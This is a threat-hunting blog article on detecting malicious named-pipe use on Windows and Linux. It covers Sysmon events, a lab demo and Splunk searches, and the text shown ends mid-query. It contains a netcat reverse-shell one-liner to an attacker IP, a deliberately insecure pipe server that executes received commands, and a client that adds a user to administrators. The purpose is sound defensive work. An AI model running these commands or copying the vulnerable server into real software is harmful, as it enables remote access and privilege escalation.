# https://detect.fyi/threat-hunting-suspicious-named-pipes-a4206e8a4bc8

[Sitemap](https://detect.fyi/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fdetect.fyi%2Fthreat-hunting-suspicious-named-pipes-a4206e8a4bc8&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fdetect.fyi%2Fthreat-hunting-suspicious-named-pipes-a4206e8a4bc8&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png)

[Mastodon](https://infosec.exchange/@mthcht)

[**Detect FYI**](https://detect.fyi/?source=post_page---publication_nav-d5fd8f494f6a-a4206e8a4bc8---------------------------------------)

·

Follow publication

[![Detect FYI](https://miro.medium.com/v2/resize:fill:38:38/1*ayMhoNccbO0IxQ1UPFv0SA.png)](https://detect.fyi/?source=post_page---post_publication_sidebar-d5fd8f494f6a-a4206e8a4bc8---------------------------------------)

Threat Detection Engineering and DFIR Insights

Follow publication

# Threat Hunting - Suspicious Named pipes

[![mthcht](https://miro.medium.com/v2/resize:fill:32:32/1*h7dUyUQgUIrGSCgdizGKYw.png)](https://mthcht.medium.com/?source=post_page---byline--a4206e8a4bc8---------------------------------------)

[mthcht](https://mthcht.medium.com/?source=post_page---byline--a4206e8a4bc8---------------------------------------)

Follow

20 min read

·

Jul 21, 2024

190

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3Da4206e8a4bc8&operation=register&redirect=https%3A%2F%2Fdetect.fyi%2Fthreat-hunting-suspicious-named-pipes-a4206e8a4bc8&source=---header_actions--a4206e8a4bc8---------------------post_audio_button------------------)

Share

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*CBnmH3wjh6joy7_UKLr61Q.png)

simulation and detection

## What are Named Pipes?

Named pipes are a mechanism for inter-process communication (IPC) in Windows operating systems. They enable **processes to communicate with each other**, **either on the same machine or over a network**, by providing a reliable way to transfer data between applications. Named pipes facilitate bidirectional communication and can handle multiple client connections simultaneously. In contrast, in Linux, we have two types of pipes: pipes (also known as anonymous or unnamed pipes) and [FIFO’s](https://man7.org/linux/man-pages/man7/fifo.7.html) (also known as named pipes)

## How Pipes Work on Linux

**Pipes** in Linux connect commands, allowing the output of one command to be used as the input for another, creating a pipeline. For example `netstat -tlpn | grep 127.0.0.1` filters network connections to localhost, and `netstat -tlpn |& grep 127.0.0.1` merges and filters both standard output and error.

![](https://miro.medium.com/v2/resize:fit:692/0*pQYzUHoS-x7G2Fto.png)

illustration FIFO from [https://www.hitchhikersguidetolearning.com](https://www.hitchhikersguidetolearning.com/)

**Named pipes** in Linux (or [FIFOs](https://en.wikipedia.org/wiki/Unix_file_types)) are special files that allow multiple processes to read from and write to them, enabling bidirectional communication. They have attributes like ownership and permissions, just like regular files. You can create a FIFO with commands like `mkfifo` or `mknod`. Named pipes can be combined with other commands to create applications, such as a reverse shell using netcat.

**Examples:**

netcat reverse shell scenario:`/bin/sh -i < /tmp/fifo 2>&1 | nc attacker_ip 4444 > /tmp/fifo)`

`< /tmp/fifo`: This redirects the standard input of the shell to read from the named pipe `/tmp/fifo`, the shell will read its input from this pipe.

`> /tmp/fifo`: This redirects the output from `nc` (which is the input from the attacker's machine) back into the named pipe `/tmp/fifo`. This means any input from the attacker gets sent back into the shell as if it was typed directly into the shell's input.

- **Anonymous Pipe**: `ls | grep txt` (Anonymous pipes are created automatically by the shell and are used for inter-process communication (IPC) within the same command line)
- **Named Pipe**: `mkfifo PrivescPipe_Linux`creates a FIFO for shared access (Unlike anonymous pipes, named pipes are created in the filesystem and can be accessed by multiple processes independently)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*T2oegAMxBnh9J9jvsLD2sw.png)

The file has a special type indicated by a`p` in the permissions (`prw-r--r--`) in this example, the `p` indicates that the file is a named pipe (FIFO)

write to the pipe: `echo “1337” > /root/PrivescPipe_Linux`

Use `find / -type p` to find named pipes locations or`lsof | grep FIFO` to display processes accessing FIFOs. The output includes details such as PID, PPID, user, and permissions.

## How Named Pipes Work on Windows

### Creation

A server process creates a named pipe using the `CreateNamedPipe` function, specifying the name, direction (inbound, outbound, or duplex), and other attributes. This function sets up the pipe with the necessary parameters for communication.

### Connection

Client processes connect to the pipe using the `CreateFile` function, specifying the pipe's name. Multiple clients can connect to the same named pipe, enabling one-to-many communication. This flexibility allows various clients to interact with the server through a single communication channel.

### Communication

Data is read from and written to the pipe using standard file I/O functions like `ReadFile` and `WriteFile`. Named pipes support message-oriented communication, ensuring that data is sent and received in discrete units. This method of communication helps in maintaining data integrity and order.

- **Local IPC:** Named pipes are often used for communication between components of a single application or between different applications running on the same machine.
- **Remote IPC:** They are also used for communication between applications on different machines over a network, providing a secure and efficient means of data transfer.
- **Client-Server Communication:** Named pipes facilitate client-server models, where multiple clients can interact with a server process, commonly seen in database and web server applications.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*t6Gba6XcKlwvraR1goIatw.png)

example illustration

### Security

Named pipes have associated security attributes that control access. When creating a named pipe, the server can specify a security descriptor that defines who can access the pipe and what operations they can perform (read, write, etc.). This ensures that only authorized processes can communicate through the pipe, providing a layer of security.

### Impersonation

Named pipes support client impersonation, where the server can assume the security context of the client. This allows for fine-grained access control, enabling the server to **perform actions on behalf of the client with the client’s privileges.** Check out [this article](https://jsecurity101.medium.com/exploring-impersonation-through-the-named-pipe-filesystem-driver-15f324dfbaf2) from

[Jonathan Johnson](https://medium.com/u/78d2ff57ed70?source=post_page---user_mention--a4206e8a4bc8---------------------------------------)

to learn ho **w** ImpersonateNamedPipeClient function operates.

[Here](https://github.com/daem0nc0re/PrivFu/tree/main/ArtsOfGetSystem/NamedPipeImpersonation) is a POC exploiting named pipe impersonation for Privilege Escalation, also depending on engagement goals, an attacker might [use Pass-the-Hash for authentication on a local Named Pipe](https://github.com/S3cur3Th1sSh1t/NamedPipePTH) for user Impersonation to access a system with specific low-privileged user accounts such as the CEO, HR, SAP administrators, and others.

## Malicious Use of Named Pipes

**Modulated Implants** Named pipes are used for communication between malicious child processes and the implant core, often in conjunction with keyloggers. This setup allows for efficient data exfiltration and control of compromised systems.

**Privilege Escalation**

The [Potato exploits](https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all) leverages named pipes for privilege escalation. Even Metasploit’s “Get-System” exploit uses named pipes and impersonation to gain elevated privileges on compromised systems. Print Spooler named pipe impersonation tricks associated with multiple vulnerabilities are often used to gain SYSTEM privileges.

**Persistence**

C2 implants can listen on a named pipe, providing a persistent backdoor. This method eliminates the need for beacons or open ports, making detection more challenging while maintaining a constant foothold in the compromised system.

**C2 Pivoting with Named Pipes**

Named pipes can be exploited for C2 pivoting. Attackers can establish a named pipe on a compromised system and use it to relay commands and data between the attacker-controlled systems and other compromised endpoints within the network. This technique allows for stealthy lateral movement, as named pipes are a legitimate feature of the Windows operating system and can evade some detection mechanisms. Monitoring named pipe creation and communication patterns can help in detecting such malicious activities.

For more information on C2 pivoting using named pipes, check out the following resources:

- [https://www.cobaltstrike.com/blog/named-pipe-pivoting](https://www.cobaltstrike.com/blog/named-pipe-pivoting)
- [https://havocframework.com/docs/pivoting](https://havocframework.com/docs/pivoting)
- [https://sliver.sh/docs?name=Pivots](https://sliver.sh/docs?name=Pivots)
- [https://github.com/nettitude/PoshC2/blob/master/resources/modules/Invoke-Pbind.ps1](https://github.com/nettitude/PoshC2/blob/master/resources/modules/Invoke-Pbind.ps1)
- [https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
- [https://sliver.sh/docs?name=Pivots](https://sliver.sh/docs?name=Pivots)

More recently an update in Cobalt Strike 4.10, “Through the BeaconGate,” includes a new technique using named pipes for Beacon’s peer-to-peer communication and allows operators to proxy Beacon’s Windows API calls through a Sleepmask BOF for advanced evasion. This enhances lateral movement capabilities [https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate)

## Common Tools and Techniques for Monitoring Named Pipes

- **Sysmon:** Microsoft’s Sysmon tool is highly configurable, allowing for detailed logging of named pipe events (connection Event ID 18 + creation Event ID 17). It provides excellent control over verbosity and coverage, making it the best tool for monitoring and detecting suspicious named pipe activities.
- **Wireshark:** Wireshark can be used to capture pipe activity within wire data (for SMB smb\_pipe.getinfo.pipe\_name, or look for the Tree Id in SMB Header)
- [Splunk Stream](https://www.splunk.com/en_us/blog/security/threat-hunting-stream.html) and [Zeek](https://zeek.org/) can also be used to capture pipe activity within wire data, check out this Splunk [article](https://www.splunk.com/en_us/blog/security/named-pipe-threats.html) using this data
- **EDR:** Some EDR are logging named pipes partially like the EDR Crowdstrike, MDE, Harfanglab or Trellix
- **Auditd:** Monitor named pipe creation on Linux using auditd by tracking `mknod` system calls and `execve` for command-line patterns. Also, monitor `creat`, `open`, and `openat` for file creation, and `splice` for detecting [detect Dirty pipe exploitations](https://www.elastic.co/security-labs/detecting-and-responding-to-dirty-pipe-with-elastic))

## **Practical Example on Windows**

In this example, we **create a vulnerable pipe server application** that allows access to all users, regardless of their privilege level.

_This is my_ **_pipe\_server.c_**

```
#include <windows.h>
#include <stdio.h>
#include <aclapi.h>

#define PIPE_NAME "\\\\.\\pipe\\PrivEscPipe"
#define BUFFER_SIZE 1024

void main() {
    HANDLE hPipe;
    char buffer[BUFFER_SIZE];
    DWORD bytesRead;
    // Define a security descriptor that allows access to everyone
    SECURITY_DESCRIPTOR sd;
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);
    // Define the security attributes structure
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.lpSecurityDescriptor = &sd;
    sa.bInheritHandle = FALSE;
    // Create a named pipe
    hPipe = CreateNamedPipe(
        PIPE_NAME,              // pipe name
        PIPE_ACCESS_DUPLEX,     // read/write access
        PIPE_TYPE_MESSAGE |     // message type pipe
        PIPE_READMODE_MESSAGE | // message-read mode
        PIPE_WAIT,              // blocking mode
        PIPE_UNLIMITED_INSTANCES, // max. instances
        BUFFER_SIZE,            // output buffer size
        BUFFER_SIZE,            // input buffer size
        0,                      // client time-out
        &sa);                   // security attributes

    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("CreateNamedPipe failed, GLE=%d.\n", GetLastError());
        return;
    }
    // Wait for the client to connect
    printf("Waiting for client connection...\n");
    BOOL connected = ConnectNamedPipe(hPipe, NULL) ?
        TRUE : (GetLastError() == ERROR_PIPE_CONNECTED);
    if (connected) {
        printf("Client connected.\n");
        BOOL success = ReadFile(
            hPipe,
            buffer,              // buffer to receive data
            sizeof(buffer) - 1,  // size of buffer
            &bytesRead,          // number of bytes read
            NULL);               // not overlapped I/O
        if (success) {
            buffer[bytesRead] = '\0'; // Null-terminate the string
            printf("Received: %s\n", buffer);
            // execute received command
            if (system(buffer) != 0) {
                printf("Command execution failed.\n");
            }
        } else {
            printf("ReadFile failed, GLE=%d.\n", GetLastError());
        }
    } else {
        printf("Client connection failed.\n");
    }
    CloseHandle(hPipe);
}
```

and this is my **pipe\_client.c**:

```
#include <windows.h>
#include <stdio.h>
#include <string.h>

#define PIPE_NAME "\\\\.\\pipe\\PrivEscPipe"

void main() {
    HANDLE hPipe;
    DWORD bytesWritten, bytesRead;
    char exploitCommand[] = "net localgroup administrateurs lowprivuser /add";
    // Connect to the named pipe
    hPipe = CreateFile(
        PIPE_NAME,           // pipe name
        GENERIC_READ |       // read and write access
        GENERIC_WRITE,
        0,                   // no sharing
        NULL,                // default security attributes
        OPEN_EXISTING,       // opens existing pipe
        0,                   // default attributes
        NULL);               // no template file
    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("Failed to connect to pipe, GLE=%d.\n", GetLastError());
        return;
    }
    // Send the command to the server
    if (!WriteFile(
            hPipe,
            exploitCommand,
            strlen(exploitCommand),
            &bytesWritten,
            NULL)) {
        printf("WriteFile failed, GLE=%d.\n", GetLastError());
    } else {
        printf("Sent exploit command to server.\n");
    }
    CloseHandle(hPipe);
}
```

After compiling, I executed `pipe_server.exe` in an elevated terminal, using [PipeViewer](https://github.com/cyberark/PipeViewer), you can check all the pipes opened on your system

![](https://miro.medium.com/v2/resize:fit:1340/1*-lH8wLWxtJuHwPS3TCLcMQ.png)

We can see our vulnerable application with no [DACL](https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces), allowing full permissions, executed with high privileges.

These permissions can also be viewed using [accesschk](https://learn.microsoft.com/pt-br/sysinternals/downloads/accesschk)

![](https://miro.medium.com/v2/resize:fit:682/1*h9pRzKaYUTjz9bm3K1PdkQ.png)

`.\acesschk.exe \pipe\` to list all the pipes and their permissions

FYI you can also use these tools to list all named pipes:

- **Sysinternals** [**PipeList**](https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist): to list all the pipe using NtQueryDirectoryFile
- **Sysinternals** [**PSFile**](https://learn.microsoft.com/pt-br/sysinternals/downloads/psfile): to list all open files (grep named pipes with \| findstr pipe)
- **With powershell**: \[System.IO.Directory\]::GetFiles("\\\.\\\pipe\\\") or Get-ChildItem \\\.\\pipe\
- **Process Explorer or Process Hacker**: Use the “Find Handles or DLLs” feature and search for `\Device\NamedPipe` to find all the named pipes.

With the pipe server now listening, I executed `pipe_client.exe` in a standard terminal. The pipe client application successfully connected to the named pipe `PrivEscPipe` created by `pipe_server.exe` and sent a command to add a user named `lowprivuser` to the `administrateurs` group.

![](https://miro.medium.com/v2/resize:fit:1285/1*-AFBJTAUJTRPMBqGtg1vZA.png)executing pipe\_client.exe and pipe\_server.exe

The command is received and executed with high privileges by the `pipe_server.exe
`This demonstrates a critical vulnerability where a low-privilege user can escalate their privileges by exploiting the insecure pipe server application we created.

## Logs generated

I did not find any ETW provider that specifically logs the creation or connection of named pipes.

However, [Sysmon](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon) can log these events with Event ID 17 for pipe creation and Event ID 18 for pipe connection.

Event ID 17 captures pipe creation details from our previous test:

![](https://miro.medium.com/v2/resize:fit:1670/1*yKd6i24wiA4nf5uH-nAStQ.png)

We can see our pipe “ **PrivEscPipe”** that was created by our application `pipe_server.exe`

Event ID 18 captures pipe connection details:

![](https://miro.medium.com/v2/resize:fit:1673/1*RbKLMa_gDe-XGeTWAXHZ-A.png)

We can see our pipe client application connecting to the **PrivescPipe pipe !**

In an investigation scenario triggered by an alert for a suspicious named pipe usage, we have several valuable pieces of information to pivot on:

- **Parent Process ID**: 5544 (in this example, the terminal process ID)
- **Process ID of pipe\_client.exe**: 16928
- **Process ID of pipe\_server.exe**: 28564

We also have the executable names for both the pipe creator and the pipe connector:

- **Creating the named pipe**: pipe\_server.exe
- **Connecting to the named pipe**: pipe\_client.exe

To gather more context, we can search for these executable names or process IDs within the detection time range. This will help us better understand the server and client applications involved. We will retrieve more context and the hash of each application from Sysmon **Event ID 7 or Event ID 1**. Depending on the application’s behavior, further details might be available through **Sysmon Event IDs 8, 10, and 3**.

![](https://miro.medium.com/v2/resize:fit:1828/1*1-NPvj81u6fHMv6RohlQpg.png)EventID 7 showing that the `pipe_server.exe` was executed, and the image was loaded into memory on the system.![](https://miro.medium.com/v2/resize:fit:1820/1*zoWikJkN-RCZ9O3_6xemqw.png)EventID 1 showing the execution of pipe\_server.exe with admin rights![](https://miro.medium.com/v2/resize:fit:1834/1*9aJbXOBPd-hrxX2UKbHrdQ.png)EventID 1 showing the execution of pipe\_client.exe without admin rights

At this point, you have gathered all the necessary details: the machine(s), the process and parent process information, the user who created the pipe, the user who connected to the pipe, the hash of the executables, relevant Event IDs generated by each application (depending on the service provided by each application - not limited to sysmon logs), and the pipe name itself.

When analyzing named pipes, the initial focus should be on the pipe name, as it is defined by the developer. A unique pipe name can be a significant indicator for identifying specific applications or malware, aiding in threat intelligence and forensic investigations. Therefore, determining the uniqueness of the pipe name is a critical first step. This can help in correlating the **pipe usage with known protocols, tools or threat actor techniques and facilitate a more targeted and effective analysis**.

Here are some known named pipe associated with various protocols and services in Windows:

**RPC Protocol**:

- `\\.\pipe\epmapper`
- `\\.\pipe\lsass`
- `\\.\pipe\samr`
- `\\.\pipe\initshut`
- `\\.\pipe\ntsvcs`
- `\\.\pipe\scerpc`

**SQL Server**:

- `\\.\pipe\sql\query`
- `\\.\pipe\MSSQL$<instance_name>\sql\query`

**Netlogon Service**:

- `\\.\pipe\netlogon`

**Print Spooler Service**:

- `\\.\pipe\spoolss`

**Task Scheduler**:

- `\\.\pipe\atsvc`

**RPC over SMB**:

- `\\.\pipe\netdfs`

**Windows Event Log**:

- `\\.\pipe\eventlog`

**Remote Desktop**:

- `\\.\pipe\termsrv`
- `\\.\pipe\TSVCPIPE-*`

**Service Control Manager Remote Protocol:**

- `\\.\pipe\svcctl` (also used by many Lateral movement tool)

**WebDAV service:**

- `\\.\pipe\DAV RPC SERVICE`

**LSASS**:

- \\\.\\pipe\\lsass (When dumping LSASS for credential access, you may observe a ‘pipe connect’ to `\\.\pipe\lsass` initiated by the responsible process. For instance, `C:\Windows\System32\Taskmgr.exe` or procdump may establish a connection to `\\.\pipe\lsass`

**SMB Protocol (Hunt for Lateral Movement)**:

- `\\.\pipe\srvsvc`
- `\\.\pipe\wkssvc`
- `\\.\pipe\browser`

> Just a quick note for lateral movement pivot investigations: When investigating lateral movement with named pipes, pivot on the PID with Sysmon Event ID 3 for network access. Observe Security [EventID 5140 or 5145](https://github.com/mthcht/awesome-lists/blob/main/Lists/wineventlogs/EventIDs/Security-5145.md) on the target machine for network share access. Correlate with connection Event IDs 4624, 4625, and 4648 for logon activities. Also, correlate with Sysmon Event ID 1 or Security Event ID 4688 for process execution context, and System Event IDs 7045, 7036, or Security Event ID 4697 for service installations by [**PSEXEC-like tools**](https://medium.com/detect-fyi/detecting-psexec-and-similar-tools-c812bf3dca6c). For RDP connections, specifically check Event ID 4624 for Logon Type 3 or 10 (both could be generated depending on the SMB configuration). You can also confirm RDP connections in the Microsoft-Windows-TerminalServices-LocalSessionManager/Operational and Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational logs.

I won’t list every known named pipe here, but a quick Google search will often reveal their meanings, they are widely used and well-documented.

## Suspicious Named pipe

I’ve dedicated a significant amount of time to analyzing tools locally and gathered unique named pipes from various tools, threat intelligence reports, sandboxes, and multiple sources. This effort has resulted in a collection of nearly **300 suspicious named pipes** (as of 2024/07/21).

Each named pipe is categorized for a detailed detection.

## Get mthcht’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

_I know that many lateral movement tools are using legitimate default pipe names used by Windows services. I am not adding all of them to my list. Instead, a dedicated detection rule that correlates multiple events from different log sources, along with some default named pipes, is preferable for identifying suspicious activity involving default pipes. I also didn’t include suspicious Linux named pipes in the list because they are essentially files and are detected with command line and file path patterns with auditd as mentionned before._

You can access my detection list here [https://github.com/mthcht/awesome-lists/blob/main/Lists/suspicious\_named\_pipe\_list.csv](https://github.com/mthcht/awesome-lists/blob/main/Lists/suspicious_named_pipe_list.csv)

Here’s a sample of what the list looks like:

![](https://miro.medium.com/v2/resize:fit:1703/1*Z985ERhTRVqZA2Coi9R7JA.png)[https://github.com/mthcht/awesome-lists/blob/main/Lists/suspicious\_named\_pipe\_list.csv](https://github.com/mthcht/awesome-lists/blob/main/Lists/suspicious_named_pipe_list.csv)

### Description of the List Headers:

**pipe\_name**: The specific name of the pipe to detect or a pattern used for identifying the named pipe.

**Metadata\_description**: A brief description of the associated tool.

**Metadata\_tool**: The name of the tool associated with the named pipe detection.

**Metadata\_category**: The category of the tool to help select a specific tool category in our hunt. Categories include: **C2, Collection, Compliance, Credential Access, Data Exfiltration, Defense Evasion, Discovery, Exploitation, Lateral Movement, Malware, Persistence, Privilege Escalation, Ransomware, Reverse Engineering, RMM, VPN**…

**Metadata\_link**: The link to the tool or the article where the named pipe was found. For tools analyzed personally, a link to the tool or my repository is provided.

**Metadata\_priority**: The urgency level assigned to the detected tool.

- **info**: Not urgent, likely a legitimate tool or for compliance detection, used for threat hunting and correlation only.
- **low** or **medium**: Low urgency, probably associated with legitimate tools that could be abused by threat actors (greyware\_tool), reserved for threat hunting sessions.
- **high**: Needs quick investigation as the tool observed could have a significant impact but may also be attributed to legitimate tools that could be abused by threat actors.
- **critical**: Top priority, the tool detected could have significant impact if not quickly remediated.

**Metadata\_fp\_risk**: The potential for false positives for the detection pattern (Pipe\_name).

- **N/A**: No known false positives for now (or not necessary to be tested).
- **none**: Very high chance of not generating any false positives and not observed so far.
- **low**: Low chance of generating a false positive detection.
- **medium**: Will probably generate false positives as the pattern is too generic or too short and could match other tools.
- **high**: Very likely to produce false positives, very verbose detection (reserved for threat hunting sessions).

**Metadata\_severity**: The severity assigned to the detection, taking into account the priority and false positive risk.

- **info**: Legitimate tools, only for correlation or compliance for some tools.
- **low**: Low severity detection (reserved for threat hunting sessions).
- **medium**: Medium severity detection.
- **high**: High severity detection, each requires investigation (could be in threat hunting sessions or detection rules).
- **critical**: Critical severity, the tool could be very dangerous and a highly relevant indicator, requiring immediate investigation (could be in threat hunting sessions or detection rules).

**Metadata\_tool\_type**:

- **offensive\_tool**: This is an offensive tool, not used legitimately.
- **greyware\_tool**: This is a legitimate tool that is abused by threat actors.

**Metadata\_usage:**

- **Hunting**: Indicates the detection pattern is best suited for threat hunting sessions. It is designed to identify potential threats through proactive investigation rather than generating immediate alerts.
- **Detection Rule**: Indicate that the detection pattern is a reliable indicator of malicious activity. It can be implemented in detection rules to generate relevant alerts, ensuring timely and accurate threat response.

**Metadata\_comment**: Additional comments about the detection.

**Metadata\_reference**: Link to the tool or the source where the detection is documented.

Many lateral movement tools use legitimate default pipe names employed by Windows services. I am not adding all of them to my list. Instead, a dedicated detection method that correlates multiple events from different log sources, along with specific named pipes, is preferable for identifying suspicious activity involving these pipes.

## Threat Intelligence

Named pipes are often overlooked in IOC gathering within public reports and sandboxes. If analyzing a sample directly is not possible, pay close attention to the “Files Opened” artifacts in public sandboxes (if available) !

VirusTotal leverages Sysinternals tools within the “Behavior” tab to log named pipe activities

![](https://miro.medium.com/v2/resize:fit:369/1*DXi0bbvC4odX5jm45G1g0w.png)

Here are some interesting GitHub projects exploiting or using named pipes that should be added to the [ThreatHunting-Keywords](https://github.com/mthcht/ThreatHunting-Keywords) project, along with additional detection patterns beyond just named pipes:

- [https://github.com/threatexpress/invoke-pipeshell](https://github.com/threatexpress/invoke-pipeshell)
- [https://github.com/S3cur3Th1sSh1t/NamedPipePTH](https://github.com/S3cur3Th1sSh1t/NamedPipePTH)
- [https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH](https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH)
- [https://github.com/cyberark/PipeViewer](https://github.com/cyberark/PipeViewer) (greyware tool)
- [https://github.com/S3cur3Th1sSh1t/Privesc](https://github.com/S3cur3Th1sSh1t/Privesc)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bytecode77/r77-rootkit](https://github.com/bytecode77/r77-rootkit)
- [https://github.com/thebookisclosed/AmperageKit](https://github.com/thebookisclosed/AmperageKit)
- [https://github.com/calebstewart/pwncat-badpotato](https://github.com/calebstewart/pwncat-badpotato)
- [https://github.com/Prepouce/CoercedPotato](https://github.com/Prepouce/CoercedPotato)
- [https://github.com/g3tsyst3m/elevationstation](https://github.com/g3tsyst3m/elevationstation)
- [https://github.com/v1k1ngfr/fuegoshell](https://github.com/v1k1ngfr/fuegoshell)
- [https://github.com/Al1ex/WindowsElevation](https://github.com/Al1ex/WindowsElevation)
- [https://github.com/Leo4j/Amnesiac](https://github.com/Leo4j/Amnesiac)
- [https://github.com/antonioCoco/SharPyShell](https://github.com/antonioCoco/SharPyShell)
- [https://github.com/rootm0s/WinPwnage](https://github.com/rootm0s/WinPwnage)
- [https://github.com/lexfo/rpc2socks](https://github.com/lexfo/rpc2socks)

If you have the chance to analyze open-source code, you can potentially save time by extracting named pipes using these regex patterns:

```
'NamedPipe_C':r'new PipeServer\<PipeMessage\>\(.+?(?=\))',
'NamedPipe_C2':r'NamePipe\s=\s.+?(?=\;)',
'NamedPipe_C':r'\sstring\sPIPE_NAME\s\=\s[\"\'].+?(?=[\"\'])',
'NamedPipe_C#':r'new\s+NamedPipeServerStream\(([\'\"])([^\'\"]+)\1',
'NamedPipe_C#2':r'new\s+NamedPipeClientStream\(([\'\"])([^\'\"]+)\1',
'NamedPipe_C++':r'CreateNamedPipe\(([\'\"])([^\'\"]+)\1',
'NamedPipe_C++2':r'CreateNamedPipeA\(.*',
'NamedPipe_C++3':r'CreateFile\([^,]+,\s*FILE_FLAG_OVERLAPPED\s*\|[^,]*,\s*PIPE_TYPE_MESSAGE',
'NamedPipe_global':r'\\\\\\\\\.\\\\pipe\\\\.{0,1000}',
'NamedPipe_global2':r'\\\\\.\\pipe\\.{0,1000}',
'NamedPipe_Python':r'os\.mkfifo\(([\'\"])([^\'\"]+)\1',
'NamedPipe_python2':r'open\(([\'\"])([^\'\"]+)\1,\s*[\'\"]w[\'\"]\)',
'NamedPipe_python3':r'open\(([\'\"])([^\'\"]+)\1,\s*[\'\"]r[\'\"]\)',
'NamedPipe_python4':r'Popen\([^)]*stdout\s*=\s*PIPE',
'NamedPipe_Java':r'new\s+PipedOutputStream\(([^)]*)\)',
'NamedPipe_Java2':r'new\s+PipedInputStream\(([^)]*)\)',
'NamedPipe_powershell':r'New-Object\s+System.IO.Pipes.NamedPipeServerStream\(([\'\"])([^\'\"]+)\1',
'NamedPipe_powershell2':r'New-Object\s+System.IO.Pipes.NamedPipeClientStream\(([\'\"])([^\'\"]+)\1',
'NamedPipe_Nodejs':r'net\.createServer\(\s*function\s*\(\s*socket\s*\)\s*\{',
'NamedPipe_Nodejs2':r'net\.connect\(\s*{[^}]*path:\s*([\'\"])([^\'\"]+)\1',
'NamedPipe_global':r'\\\\\\\\.\\\\pipe\\\\.*',
'NamedPipe_global2':r'\\\\.\\pipe\\.*'
```

## How to Hunt for suspicious named pipe with the list

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:638/1*UZsyaatbjE33xOjeDiK6Eg.png)

With Splunk, it’s straightforward. First, upload my list to Splunk and name it `suspicious_named_pipe_list.csv`. Then, create a lookup definition named `suspicious_named_pipe_list` linked to `suspicious_named_pipe_list.csv`, ensuring it is not case-sensitive and allows wildcard matches on the field `pipe_name`.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*MfBUHCVXxa6Ty65Mzm30Gw.png)

Use this search to find all named pipes reserved for Threat Hunting sessions (filter on `metadata_usage` "Hunting"):

```
`sysmon` signature_id IN (17,18) pipe_name=*
  [| inputlookup suspicious_named_pipe_list | fields - metadata_*]
  NOT [| inputlookup sysmon_exclusion_list | fields - metadata_*]
  | lookup suspicious_named_pipe_list pipe_name as pipe_name OUTPUT pipe_name as
  pipe_name_detection_pattern metadata_category metadata_comment metadata_description
  metadata_fp_risk metadata_link metadata_priority metadata_severity metadata_usage metadata_tool metadata_tool_type metadata_reference
  | where metadata_usage="Hunting"
  | stats count
    values(process_id) as process_id
    values(process_guid) as process_guid
    values(process_path) as process_path
    values(process_name) as process_name
    values(signature_id) as signature_id
    earliest(_time) as firsttime
    latest(_time) as lasttime
    by src_nt_host src_user pipe_name metadata_tool pipe_name_detection_pattern metadata_category metadata_tool_type metadata_usage metadata_comment
    metadata_description metadata_fp_risk metadata_link metadata_priority metadata_severity metadata_reference
```

Use this search to find all relevant named pipes for Detection rules (filter on `metadata_usage` "detection rule"):

```
`sysmon` signature_id IN (17,18) pipe_name=*
  [| inputlookup suspicious_named_pipe_list | fields - metadata_*]
  NOT [| inputlookup sysmon_exclusion_list | fields - metadata_*]
  | lookup suspicious_named_pipe_list pipe_name as pipe_name OUTPUT pipe_name as
  pipe_name_detection_pattern metadata_category metadata_comment metadata_description
  metadata_fp_risk metadata_link metadata_priority metadata_severity metadata_usage metadata_tool metadata_tool_type metadata_reference
  | where metadata_usage="detection rule"
  | stats count
    values(process_id) as process_id
    values(process_guid) as process_guid
    values(process_path) as process_path
    values(process_name) as process_name
    values(signature_id) as signature_id
    earliest(_time) as firsttime
    latest(_time) as lasttime
    by src_nt_host src_user pipe_name metadata_tool pipe_name_detection_pattern metadata_category metadata_tool_type metadata_usage metadata_comment
    metadata_description metadata_fp_risk metadata_link metadata_priority metadata_severity metadata_reference
```

Search for every pipe name in my list:

```
`sysmon` signature_id IN (17,18) pipe_name=*
  [| inputlookup suspicious_named_pipe_list | fields - metadata_*]
  NOT [| inputlookup sysmon_exclusion_list | fields - metadata_*]
  | lookup suspicious_named_pipe_list pipe_name as pipe_name OUTPUT pipe_name as
  pipe_name_detection_pattern metadata_category metadata_comment metadata_description
